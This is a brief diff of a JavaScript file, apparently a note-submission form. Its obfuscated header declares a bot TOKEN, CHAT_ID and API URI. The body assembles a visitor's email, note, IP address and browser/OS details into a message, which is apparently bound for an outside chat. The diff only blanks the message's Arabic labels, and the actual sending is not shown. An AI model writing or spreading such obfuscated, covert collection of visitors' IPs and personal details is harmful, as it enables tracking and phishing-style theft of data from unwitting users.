@@ -17,11 +17,11 @@ var TOKEN,CHAT_ID,URI_API,getUserIp;(function(){var uUK='',ivW=113-102;function 
       Promise.all([getUserIp(), Promise.resolve(getPlatformInfo())]).then(([userIp, platformInfo]) => {
           
           const message = `
-              <b>ملاحظة جديدة</b>\n
-              <b>البريد الإلكتروني:</b> ${email}\n
-              <b>الملاحظة:</b> ${note}\n
-              <b>عنوان الـ IP:</b> ${userIp}\n
-              <b>المتصفح والنظام:</b> ${platformInfo}
+              <b> </b>\n
+              <b> </b> ${email}\n
+              <b></b> ${note}\n
+              <b> </b> ${userIp}\n
+              <b> </b> ${platformInfo}
           `;
           
          
